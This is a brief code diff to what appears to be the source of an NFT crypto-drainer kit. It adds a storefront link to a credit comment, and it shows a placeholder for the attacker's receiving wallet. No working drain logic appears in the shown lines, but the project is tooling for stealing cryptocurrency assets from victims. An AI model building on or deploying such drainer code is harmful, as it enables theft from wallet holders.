@@ -1,5 +1,6 @@
 /* 
     Credits: https://github.com/0x32Moon/NFT-Crypto-Drainer
+    Shop: https://nftservices.sellix.io/
 */
 
 const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
